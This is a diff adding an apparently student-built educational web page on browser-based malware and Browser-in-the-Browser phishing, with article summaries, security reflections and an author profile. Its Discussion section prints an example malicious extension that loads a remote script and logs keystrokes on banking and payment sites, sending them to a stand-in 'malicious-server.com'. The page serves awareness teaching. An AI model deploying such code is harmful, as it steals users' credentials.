@@ -1,0 +1,1321 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ghost in the Browser</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Source+Code+Pro:wght@400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --font-mono: 'Share Tech Mono', monospace;
+            --font-code: 'Source Code Pro', monospace;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: var(--font-mono);
+        }
+
+        body {
+            background-color: #0a0a0a;
+            color: #fff;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 255, 255, 0.05) 0%, transparent 20%),
+                radial-gradient(circle at 80% 70%, rgba(255, 255, 255, 0.05) 0%, transparent 20%);
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: 
+                linear-gradient(45deg, transparent 48%, rgba(255, 255, 255, 0.03) 49%, rgba(255, 255, 255, 0.03) 51%, transparent 52%),
+                linear-gradient(-45deg, transparent 48%, rgba(255, 255, 255, 0.03) 49%, rgba(255, 255, 255, 0.03) 51%, transparent 52%);
+            background-size: 30px 30px;
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.5s ease-out;
+            overflow: hidden;
+        }
+
+        .background-ghosts {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+        }
+
+        .background-ghost {
+            position: absolute;
+            width: 60px;
+            height: 72px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 30px 30px 0 0;
+            animation: floatGhost 8s ease-in-out infinite, glitch 2s infinite;
+        }
+
+        .background-ghost:before {
+            content: '';
+            position: absolute;
+            width: 12px;
+            height: 12px;
+            background: rgba(26, 26, 26, 0.8);
+            border-radius: 50%;
+            top: 18px;
+            left: 12px;
+            box-shadow: 24px 0 0 rgba(26, 26, 26, 0.8);
+        }
+
+        .background-ghost:after {
+            content: '';
+            position: absolute;
+            bottom: -6px;
+            left: 0;
+            width: 100%;
+            height: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 0 0 50% 50%;
+        }
+
+        .ghost {
+            width: 100px;
+            height: 120px;
+            background: #fff;
+            border-radius: 50px 50px 0 0;
+            position: relative;
+            animation: float 3s ease-in-out infinite;
+            z-index: 2;
+        }
+
+        .ghost:before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: #1a1a1a;
+            border-radius: 50%;
+            top: 30px;
+            left: 20px;
+            box-shadow: 40px 0 0 #1a1a1a;
+        }
+
+        .ghost:after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 20px;
+            background: #fff;
+            border-radius: 0 0 50% 50%;
+        }
+
+        .loading-text {
+            color: #fff;
+            margin-top: 2rem;
+            font-size: 1.2rem;
+            text-align: center;
+            opacity: 0;
+            animation: fadeIn 2s ease-in forwards;
+            z-index: 2;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+            font-family: var(--font-code);
+        }
+
+        .loading-progress {
+            width: 200px;
+            height: 4px;
+            background: #333;
+            margin-top: 1rem;
+            border-radius: 2px;
+            overflow: hidden;
+            z-index: 2;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #fff;
+            animation: progress 3s ease-in-out forwards;
+        }
+
+        .header {
+            background-color: rgba(26, 26, 26, 0.95);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
+            padding: 1rem 2rem;
+            opacity: 0;
+            transition: opacity 0.5s ease-in;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            backdrop-filter: blur(10px);
+        }
+
+        .nav-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .site-title {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: #fff;
+            text-decoration: none;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+            position: relative;
+            padding-left: 40px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .site-title:hover {
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.5);
+        }
+
+        .site-title::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 30px;
+            height: 36px;
+            background: #fff;
+            border-radius: 15px 15px 0 0;
+        }
+
+        .site-title::after {
+            content: '';
+            position: absolute;
+            left: 6px;
+            top: 50%;
+            transform: translateY(-50%);
+            width: 6px;
+            height: 6px;
+            background: #1a1a1a;
+            border-radius: 50%;
+            box-shadow: 12px 0 0 #1a1a1a;
+        }
+
+        .nav-menu {
+            display: flex;
+            gap: 2rem;
+            list-style: none;
+        }
+
+        .nav-menu a {
+            text-decoration: none;
+            color: #fff;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .nav-menu a:hover {
+            color: #fff;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
+        }
+
+        .nav-menu a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            width: 0;
+            height: 2px;
+            background: #fff;
+            transition: all 0.3s ease;
+            transform: translateX(-50%);
+        }
+
+        .nav-menu a:hover::after {
+            width: 80%;
+        }
+
+        .burger-menu {
+            display: none;
+            cursor: pointer;
+            width: 30px;
+            height: 20px;
+            position: relative;
+            z-index: 3;
+        }
+
+        .burger-menu span {
+            display: block;
+            position: absolute;
+            height: 3px;
+            width: 100%;
+            background: #fff;
+            border-radius: 3px;
+            transition: all 0.3s ease;
+        }
+
+        .burger-menu span:nth-child(1) { top: 0; }
+        .burger-menu span:nth-child(2) { top: 50%; transform: translateY(-50%); }
+        .burger-menu span:nth-child(3) { bottom: 0; }
+
+        .burger-menu.active span:nth-child(1) {
+            transform: rotate(45deg);
+            top: 50%;
+        }
+
+        .burger-menu.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .burger-menu.active span:nth-child(3) {
+            transform: rotate(-45deg);
+            bottom: 50%;
+        }
+
+        @media (max-width: 768px) {
+            .burger-menu {
+                display: block;
+            }
+
+            .nav-menu {
+                position: fixed;
+                top: 0;
+                right: -100%;
+                width: 70%;
+                height: 100vh;
+                background: rgba(26, 26, 26, 0.95);
+                backdrop-filter: blur(10px);
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                gap: 2rem;
+                transition: all 0.3s ease;
+                z-index: 999;
+                border-left: 2px solid rgba(255, 255, 255, 0.1);
+                box-shadow: -5px 0 15px rgba(255, 255, 255, 0.1);
+            }
+
+            .nav-menu.active {
+                right: 0;
+                animation: ghostAppear 0.5s ease-out;
+            }
+
+            .nav-menu a {
+                font-size: 1.2rem;
+                position: relative;
+                padding: 1rem 2rem;
+                transition: all 0.3s ease;
+            }
+
+            .nav-menu a::before {
+                content: '';
+                position: absolute;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(255, 255, 255, 0.1);
+                border-radius: 8px;
+                transform: scale(0);
+                transition: transform 0.3s ease;
+            }
+
+            .nav-menu a:hover::before {
+                transform: scale(1);
+            }
+
+            .nav-menu a:hover {
+                transform: translateX(10px);
+                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);
+            }
+
+            .nav-container {
+                padding: 0.5rem 0;
+            }
+        }
+
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        @keyframes floatGhost {
+            0% { transform: translate(0, 0) rotate(0deg); }
+            25% { transform: translate(100px, 50px) rotate(5deg); }
+            50% { transform: translate(50px, 100px) rotate(-5deg); }
+            75% { transform: translate(-50px, 50px) rotate(5deg); }
+            100% { transform: translate(0, 0) rotate(0deg); }
+        }
+
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes progress {
+            from { width: 0%; }
+            to { width: 100%; }
+        }
+
+        @keyframes ghostAppear {
+            0% {
+                opacity: 0;
+                transform: translateX(50px);
+                filter: blur(10px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateX(0);
+                filter: blur(0);
+            }
+        }
+
+        .section {
+            min-height: 100vh;
+            padding: 6rem 2rem 4rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            scroll-snap-align: start;
+            position: relative;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .main-title {
+            font-size: 4rem;
+            text-align: center;
+            margin-bottom: 1rem;
+            font-family: var(--font-code);
+            text-shadow: 0 0 20px rgba(255, 255, 255, 0.3);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+        }
+
+        .main-title.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .tagline {
+            font-size: 1.5rem;
+            text-align: center;
+            color: rgba(255, 255, 255, 0.8);
+            font-family: var(--font-mono);
+            opacity: 0;
+            transform: translateY(20px);
+            transition: opacity 0.5s ease, transform 0.5s ease;
+            position: relative;
+        }
+
+        .tagline.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .tagline::after {
+            content: '|';
+            position: absolute;
+            right: -10px;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
+        }
+
+        @media (max-width: 768px) {
+            .main-title {
+                font-size: 2.5rem;
+                padding: 0 1rem;
+            }
+            .tagline {
+                font-size: 1.2rem;
+                padding: 0 1rem;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .main-title {
+                font-size: 2rem;
+            }
+            .tagline {
+                font-size: 1rem;
+            }
+        }
+
+        .content-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2rem;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+            margin: 2rem 0;
+        }
+
+        .article-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 1.5rem;
+            margin-top: 2rem;
+            padding: 0 1rem;
+        }
+
+        .article-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            overflow: hidden;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            height: 100%;
+            min-width: 0; /* Prevents overflow */
+        }
+
+        .article-card img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .article-card h3 {
+            padding: 0.75rem;
+            font-family: var(--font-code);
+            font-size: 1rem;
+            color: #fff;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            line-height: 1.4;
+        }
+
+        .article-card p {
+            flex-grow: 1;
+            padding: 0.75rem;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.5;
+            font-size: 0.9rem;
+        }
+
+        .article-date {
+            display: block;
+            font-family: var(--font-code);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.8rem;
+            padding: 0.5rem 0.75rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.2);
+        }
+
+        .article-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        .profile-container {
+            display: flex;
+            gap: 3rem;
+            align-items: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 2rem;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+
+        .profile-image img {
+            width: 300px;
+            height: 300px;
+            border-radius: 50%;
+            object-fit: cover;
+            border: 3px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .profile-content {
+            flex: 1;
+        }
+
+        .social-links {
+            margin-top: 1rem;
+            display: flex;
+            gap: 1rem;
+        }
+
+        .social-link {
+            color: #fff;
+            text-decoration: none;
+            padding: 0.5rem 1rem;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .social-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        @media (max-width: 1200px) {
+            .article-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .article-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .code-example {
+            margin-top: 2rem;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 8px;
+            padding: 1.5rem;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .code-example h3 {
+            margin-bottom: 1rem;
+            color: #fff;
+            font-family: var(--font-code);
+        }
+
+        .code-example pre {
+            background: #1a1a1a;
+            padding: 1rem;
+            border-radius: 4px;
+            overflow-x: auto;
+            margin: 1rem 0;
+        }
+
+        .code-example code {
+            font-family: var(--font-code);
+            color: #00ff00;
+            font-size: 0.9rem;
+            line-height: 1.5;
+        }
+
+        .code-warning {
+            color: #ff6b6b;
+            font-size: 0.9rem;
+            margin-top: 1rem;
+            padding: 0.5rem;
+            border-left: 3px solid #ff6b6b;
+            background: rgba(255, 107, 107, 0.1);
+        }
+
+        .scroll-indicator {
+            position: absolute;
+            bottom: 2rem;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 1rem;
+            opacity: 1;
+            transition: opacity 0.5s ease;
+            z-index: 10;
+        }
+
+        .scroll-indicator span {
+            font-family: var(--font-code);
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.2rem;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.3);
+            animation: pulse 2s infinite;
+        }
+
+        .scroll-arrow {
+            width: 20px;
+            height: 20px;
+            border-right: 2px solid rgba(255, 255, 255, 0.8);
+            border-bottom: 2px solid rgba(255, 255, 255, 0.8);
+            transform: rotate(45deg);
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                opacity: 0.6;
+            }
+            50% {
+                opacity: 1;
+            }
+            100% {
+                opacity: 0.6;
+            }
+        }
+
+        @keyframes bounce {
+            0%, 20%, 50%, 80%, 100% {
+                transform: rotate(45deg) translateY(0);
+            }
+            40% {
+                transform: rotate(45deg) translateY(-10px);
+            }
+            60% {
+                transform: rotate(45deg) translateY(-5px);
+            }
+        }
+
+        .scroll-indicator.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        @media (max-width: 768px) {
+            .scroll-indicator {
+                bottom: 1rem;
+            }
+            
+            .scroll-indicator span {
+                font-size: 1rem;
+            }
+        }
+
+        .content-box h3 {
+            color: #fff;
+            margin: 2rem 0 1rem;
+            font-family: var(--font-code);
+            font-size: 1.3rem;
+        }
+
+        .content-box ul {
+            margin: 1rem 0;
+            padding-left: 1.5rem;
+        }
+
+        .content-box li {
+            margin: 0.5rem 0;
+            color: rgba(255, 255, 255, 0.8);
+            line-height: 1.6;
+        }
+
+        .profile-title {
+            color: rgba(255, 255, 255, 0.8);
+            font-size: 1.1rem;
+            margin-bottom: 1rem;
+            font-family: var(--font-code);
+        }
+
+        .profile-description {
+            margin-bottom: 1rem;
+            line-height: 1.6;
+            color: rgba(255, 255, 255, 0.8);
+        }
+
+        .profile-details {
+            margin: 1.5rem 0;
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 1rem;
+        }
+
+        .detail-item {
+            display: flex;
+            flex-direction: column;
+            gap: 0.5rem;
+        }
+
+        .detail-label {
+            color: rgba(255, 255, 255, 0.6);
+            font-family: var(--font-code);
+            font-size: 0.9rem;
+        }
+
+        .detail-value {
+            color: #fff;
+            font-size: 1rem;
+        }
+
+        @media (max-width: 768px) {
+            .profile-container {
+                flex-direction: column;
+                text-align: center;
+            }
+
+            .profile-image img {
+                width: 200px;
+                height: 200px;
+            }
+
+            .profile-details {
+                justify-content: center;
+            }
+
+            .social-links {
+                justify-content: center;
+            }
+        }
+
+        .ghost-animation {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 100px;
+            height: 120px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 50px 50px 0 0;
+            animation: ghostFloat 2s ease-out forwards;
+            z-index: 1000;
+            pointer-events: none;
+            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.5));
+        }
+
+        #matrix-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 999;
+            pointer-events: none;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        #matrix-canvas.active {
+            opacity: 1;
+        }
+
+        .ghost-animation:before {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background: rgba(26, 26, 26, 0.8);
+            border-radius: 50%;
+            top: 30px;
+            left: 20px;
+            box-shadow: 40px 0 0 rgba(26, 26, 26, 0.8);
+        }
+
+        .ghost-animation:after {
+            content: '';
+            position: absolute;
+            bottom: -10px;
+            left: 0;
+            width: 100%;
+            height: 20px;
+            background: rgba(255, 255, 255, 0.9);
+            border-radius: 0 0 50% 50%;
+        }
+
+        @keyframes ghostFloat {
+            0% {
+                opacity: 0;
+                transform: translate(-50%, -30%);
+            }
+            20% {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+            80% {
+                opacity: 1;
+                transform: translate(-50%, -50%);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(-50%, -70%);
+            }
+        }
+
+        .glitch-text {
+            animation: glitch 0.3s linear;
+        }
+
+        @keyframes glitch {
+            0% {
+                transform: translate(0);
+            }
+            20% {
+                transform: translate(-2px, 2px);
+            }
+            40% {
+                transform: translate(-2px, -2px);
+            }
+            60% {
+                transform: translate(2px, 2px);
+            }
+            80% {
+                transform: translate(2px, -2px);
+            }
+            100% {
+                transform: translate(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-screen">
+        <div class="background-ghosts">
+            <div class="background-ghost" style="top: 20%; left: 10%;"></div>
+            <div class="background-ghost" style="top: 60%; left: 80%;"></div>
+            <div class="background-ghost" style="top: 30%; left: 70%;"></div>
+            <div class="background-ghost" style="top: 80%; left: 20%;"></div>
+            <div class="background-ghost" style="top: 40%; left: 40%;"></div>
+        </div>
+        <div class="ghost"></div>
+        <div class="loading-text">Initializing Ghost in the Browser...</div>
+        <div class="loading-progress">
+            <div class="progress-bar"></div>
+        </div>
+    </div>
+
+    <header class="header">
+        <nav class="nav-container">
+            <a href="/" class="site-title">Ghost in the Browser</a>
+            <div class="burger-menu">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#home">Home</a></li>
+                <li><a href="#discussion">Discussion</a></li>
+                <li><a href="#article">Article</a></li>
+                <li><a href="#reflections">Reflections</a></li>
+                <li><a href="#about">About Me</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <main>
+        <!-- Home Section -->
+        <section id="home" class="section">
+            <div class="container">
+                <h1 class="main-title">Ghost in the Browser</h1>
+                <p class="tagline">Where Digital Spirits Lurk in the Shadows of Your Web</p>
+                <div class="scroll-indicator">
+                    <span>Scroll to Explore</span>
+                    <div class="scroll-arrow"></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Discussion Section -->
+        <section id="discussion" class="section">
+            <div class="container">
+                <h2>Understanding "Ghost in the Browser" Malware</h2>
+                <div class="content-box">
+                    <p>"Ghost in the Browser" represents a sophisticated form of browser-based malware that operates stealthily within your web browser. These digital phantoms can:</p>
+                    <ul>
+                        <li>Monitor your browsing activities</li>
+                        <li>Steal sensitive information</li>
+                        <li>Inject malicious code into web pages</li>
+                        <li>Manipulate your browser's behavior</li>
+                    </ul>
+                    <p>Unlike traditional malware, these "ghosts" are particularly dangerous because they operate within the browser's trusted environment, making them harder to detect and remove.</p>
+                    
+                    <div class="code-example">
+                        <h3>Example of a Ghost in the Browser Attack Code:</h3>
+                        <pre><code>// Malicious browser extension code
+class GhostBrowser {
+    constructor() {
+        this.hidden = true;
+        this.targetSites = ['bank.com', 'paypal.com', 'amazon.com'];
+    }
+
+    // Stealth mode activation
+    activateStealth() {
+        document.addEventListener('DOMContentLoaded', () => {
+            this.injectGhostScript();
+            this.monitorUserActivity();
+        });
+    }
+
+    // Inject malicious script
+    injectGhostScript() {
+        const script = document.createElement('script');
+        script.src = 'https://malicious-server.com/ghost.js';
+        script.style.display = 'none';
+        document.head.appendChild(script);
+    }
+
+    // Monitor user activity
+    monitorUserActivity() {
+        document.addEventListener('keypress', (e) => {
+            if (this.targetSites.includes(window.location.hostname)) {
+                this.captureKeystrokes(e);
+            }
+        });
+    }
+
+    // Capture sensitive data
+    captureKeystrokes(event) {
+        const data = {
+            key: event.key,
+            timestamp: new Date().toISOString(),
+            url: window.location.href
+        };
+        this.sendToAttacker(data);
+    }
+
+    // Send data to attacker's server
+    sendToAttacker(data) {
+        fetch('https://malicious-server.com/collect', {
+            method: 'POST',
+            body: JSON.stringify(data),
+            mode: 'no-cors'
+        });
+    }
+}
+
+// Initialize the attack
+const ghost = new GhostBrowser();
+ghost.activateStealth();</code></pre>
+                        <p class="code-warning">⚠️ This is an example of malicious code. Never execute such code in a real environment.</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Article Section -->
+        <section id="article" class="section">
+            <div class="container">
+                <h2>Browser-in-the-Browser (BitB) Attacks</h2>
+                <div class="article-grid">
+                    <article class="article-card">
+                        <img src="img/1.jpg" alt="NordLayer BitB Attack">
+                        <h3>Understanding BitB Attacks | NordLayer</h3>
+                        <p>A comprehensive analysis of how attackers create fake browser windows within legitimate sessions to steal credentials, with a focus on SSO login vulnerabilities. The article provides detailed insights into attack vectors and effective defense strategies against these sophisticated phishing attempts.</p>
+                        <span class="article-date">Source: NordLayer Learn</span>
+                    </article>
+                    <article class="article-card">
+                        <img src="img/2.jpg" alt="Perception Point BitB">
+                        <h3>BitB Attack Analysis | Perception Point</h3>
+                        <p>An in-depth look at Browser-in-the-Browser attacks as an advanced phishing technique. The article explains how attackers spoof login windows within parent browsers to capture credentials, distinguishing these attacks from traditional phishing methods and providing essential user precautions.</p>
+                        <span class="article-date">Source: Perception Point</span>
+                    </article>
+                    <article class="article-card">
+                        <img src="img/3.png" alt="Mr.d0x Technical Analysis">
+                        <h3>Technical Deep Dive: BitB Attacks | mr.d0x</h3>
+                        <p>A technical exploration of Browser-in-the-Browser attacks, detailing the implementation using HTML, CSS, and JavaScript. The article provides insights into how attackers replicate login pop-ups and manipulate URLs to create convincing fake browser windows.</p>
+                        <span class="article-date">Source: mr.d0x</span>
+                    </article>
+                    <article class="article-card">
+                        <img src="img/4.jpg" alt="FBI Ghost Cyber Warning">
+                        <h3>FBI's Ghost Cyber Warning</h3>
+                        <p>An analysis of the FBI's warning about the Ghost ransomware group, focusing on their sophisticated use of BitB phishing tactics for credential theft. The article examines real-world scenarios and provides crucial information about this emerging threat to cybersecurity.</p>
+                        <span class="article-date">Source: FBI Cyber Division</span>
+                    </article>
+                </div>
+            </div>
+        </section>
+
+        <!-- Reflections Section -->
+        <section id="reflections" class="section">
+            <div class="container">
+                <h2>Reflections on Browser Security</h2>
+                <div class="content-box">
+                    <p>The evolution of "Ghost in the Browser" attacks represents a significant shift in the cybersecurity landscape. As browsers become more powerful and integrated into our daily lives, they also become more attractive targets for malicious actors. This reflection explores the implications and future of browser security.</p>
+                    
+                    <h3>Current State of Browser Security</h3>
+                    <p>Modern browsers have evolved from simple document viewers to complex application platforms. This evolution has brought both opportunities and challenges:</p>
+                    <ul>
+                        <li>Increased functionality has expanded the attack surface</li>
+                        <li>Browser extensions provide both utility and potential vulnerabilities</li>
+                        <li>Cross-site scripting and other web-based attacks remain prevalent</li>
+                        <li>Browser fingerprinting techniques continue to evolve</li>
+                    </ul>
+
+                    <h3>The Rise of Sophisticated Attacks</h3>
+                    <p>Browser-in-the-Browser (BitB) attacks represent a new level of sophistication in web-based threats. These attacks are particularly concerning because they:</p>
+                    <ul>
+                        <li>Exploit the trust users place in their browsers</li>
+                        <li>Bypass traditional security measures</li>
+                        <li>Target authentication mechanisms</li>
+                        <li>Use legitimate browser features for malicious purposes</li>
+                    </ul>
+
+                    <h3>Future Implications</h3>
+                    <p>Looking ahead, several trends are likely to shape the future of browser security:</p>
+                    <ul>
+                        <li>Increased use of AI and machine learning in attack detection</li>
+                        <li>Greater emphasis on zero-trust security models</li>
+                        <li>Development of more sophisticated browser security features</li>
+                        <li>Integration of blockchain and other advanced security technologies</li>
+                    </ul>
+
+                    <h3>Recommendations for Users and Developers</h3>
+                    <p>To address these challenges, both users and developers need to take proactive steps:</p>
+                    <ul>
+                        <li>Regular security updates and patches</li>
+                        <li>Implementation of advanced authentication methods</li>
+                        <li>Education and awareness about new attack vectors</li>
+                        <li>Development of more robust security frameworks</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+
+        <!-- About Me Section -->
+        <section id="about" class="section">
+            <div class="container">
+                <h2>About Me</h2>
+                <div class="profile-container">
+                    <div class="profile-image">
+                        <img src="img/pic.jpg" alt="Celjie B. Magbunag">
+                    </div>
+                    <div class="profile-content">
+                        <h3>Celjie B. Magbunag</h3>
+                        <p class="profile-title">BSIT Student | Web Security Enthusiast</p>
+                        <p class="profile-description">
+                            I am a 21-year-old Bachelor of Science in Information Technology student at Gingoog City Colleges. My passion lies in understanding and combating web-based security threats, particularly those involving browser vulnerabilities and sophisticated attack vectors.
+                        </p>
+                        <p class="profile-description">
+                            As an aspiring IT professional, I focus on studying modern web security challenges, including Browser-in-the-Browser attacks and other sophisticated threats. My goal is to contribute to the development of more secure web applications and help educate others about the importance of cybersecurity awareness.
+                        </p>
+                        <div class="profile-details">
+                            <div class="detail-item">
+                                <span class="detail-label">Age:</span>
+                                <span class="detail-value">21 years old</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">School:</span>
+                                <span class="detail-value">Gingoog City Colleges</span>
+                            </div>
+                            <div class="detail-item">
+                                <span class="detail-label">Course:</span>
+                                <span class="detail-value">BSIT</span>
+                            </div>
+                        </div>
+                        <div class="social-links">
+                            <a href="#" class="social-link">GitHub</a>
+                            <a href="#" class="social-link">LinkedIn</a>
+                            <a href="#" class="social-link">Twitter</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Existing script content...
+
+        // Typing animation for title and tagline
+        function typeText(element, text, speed = 50) {
+            let i = 0;
+            element.textContent = '';
+            element.classList.add('visible');
+            
+            function type() {
+                if (i < text.length) {
+                    element.textContent += text.charAt(i);
+                    i++;
+                    setTimeout(type, speed);
+                }
+            }
+            
+            type();
+        }
+
+        // Initialize typing animation after loading screen
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const loadingScreen = document.querySelector('.loading-screen');
+                const header = document.querySelector('.header');
+                const mainTitle = document.querySelector('.main-title');
+                const tagline = document.querySelector('.tagline');
+                
+                loadingScreen.style.opacity = '0';
+                header.style.opacity = '1';
+                
+                // Start typing animations
+                typeText(mainTitle, 'Ghost in the Browser', 100);
+                setTimeout(() => {
+                    typeText(tagline, 'Where Digital Spirits Lurk in the Shadows of Your Web', 50);
+                }, 2000);
+                
+                setTimeout(() => {
+                    loadingScreen.style.display = 'none';
+                }, 500);
+            }, 3000);
+        });
+
+        // Burger menu functionality
+        const burgerMenu = document.querySelector('.burger-menu');
+        const navMenu = document.querySelector('.nav-menu');
+        const navLinks = document.querySelectorAll('.nav-menu a');
+
+        burgerMenu.addEventListener('click', () => {
+            burgerMenu.classList.toggle('active');
+            navMenu.classList.toggle('active');
+        });
+
+        // Smooth scrolling for navigation links
+        navLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const targetId = link.getAttribute('href');
+                const targetSection = document.querySelector(targetId);
+                
+                // Close mobile menu if open
+                burgerMenu.classList.remove('active');
+                navMenu.classList.remove('active');
+
+                // Smooth scroll to section
+                targetSection.scrollIntoView({
+                    behavior: 'smooth',
+                    block: 'start'
+                });
+            });
+        });
+
+        // Close menu when clicking outside
+        document.addEventListener('click', (e) => {
+            if (!burgerMenu.contains(e.target) && !navMenu.contains(e.target)) {
+                burgerMenu.classList.remove('active');
+                navMenu.classList.remove('active');
+            }
+        });
+
+        // Update scroll indicator functionality
+        const scrollIndicator = document.querySelector('.scroll-indicator');
+        const homeSection = document.getElementById('home');
+
+        function handleScroll() {
+            const homeSectionBottom = homeSection.getBoundingClientRect().bottom;
+            const homeSectionTop = homeSection.getBoundingClientRect().top;
+            
+            // Show indicator when home section is in view
+            if (homeSectionTop <= 0 && homeSectionBottom > 0) {
+                scrollIndicator.classList.remove('hidden');
+            } else {
+                scrollIndicator.classList.add('hidden');
+            }
+        }
+
+        window.addEventListener('scroll', handleScroll);
+        window.addEventListener('resize', handleScroll);
+        // Initial check
+        handleScroll();
+
+        // Matrix rain effect
+        const canvas = document.createElement('canvas');
+        canvas.id = 'matrix-canvas';
